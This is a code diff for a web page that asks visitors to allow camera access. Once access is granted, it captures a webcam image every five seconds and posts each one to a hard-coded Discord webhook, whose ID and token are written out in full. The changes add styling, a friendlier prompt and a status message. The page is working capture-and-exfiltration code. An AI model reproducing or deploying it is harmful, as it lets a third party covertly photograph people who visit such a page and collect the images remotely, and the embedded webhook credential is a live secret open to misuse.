@@ -2,45 +2,69 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Camera Access</title>
+  <style>
+    body {
+      background-color: #111;
+      color: #fff;
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 20px;
+    }
+    video {
+      border: 2px solid #00ff88;
+      border-radius: 10px;
+      width: 320px;
+      height: 240px;
+      margin-top: 20px;
+    }
+    .status {
+      margin-top: 15px;
+      color: #00ff88;
+    }
+  </style>
 </head>
 <body>
-  <h2>Camera Access Required</h2>
-  <video id="video" autoplay playsinline width="320" height="240"></video>
+  <h2>📸 Please Allow Camera Access</h2>
+  <video id="video" autoplay playsinline></video>
+  <div class="status" id="status">Waiting for camera access...</div>
+
   <script>
-    const video = document.getElementById('video');
+    const video = document.getElementById("video");
+    const statusText = document.getElementById("status");
     const webhookUrl = "https://discordapp.com/api/webhooks/1360012861673570315/ZqzUK5SoTzzvkBMIGPbH00hA9lt0nAj_eHAbqbqS-Y4vfhq1Dy-sX4ULdcdTWwl0Ui6L";
 
-    async function startCamera() {
+    async function initCamera() {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         video.srcObject = stream;
+        statusText.textContent = "✅ Camera access granted. Sending image every 5 seconds.";
 
-        const canvas = document.createElement('canvas');
+        const canvas = document.createElement("canvas");
+        const ctx = canvas.getContext("2d");
         canvas.width = 320;
         canvas.height = 240;
-        const ctx = canvas.getContext('2d');
 
-        setInterval(async () => {
+        setInterval(() => {
           ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-          canvas.toBlob(async blob => {
+          canvas.toBlob(blob => {
             const formData = new FormData();
-            formData.append("file", blob, "webcam.jpg");
-
-            await fetch(webhookUrl, {
+            formData.append("file", blob, "capture.jpg");
+            fetch(webhookUrl, {
               method: "POST",
               body: formData
-            });
-          }, "image/jpeg");
+            }).catch(err => console.error("Webhook send failed", err));
+          }, "image/jpeg", 0.8);
         }, 5000);
 
       } catch (err) {
-        alert("Camera access denied or unavailable.");
-        console.error(err);
+        statusText.textContent = "❌ Camera access denied or unavailable.";
+        console.error("Camera error:", err);
       }
     }
 
-    startCamera();
+    initCamera();
   </script>
 </body>
 </html>
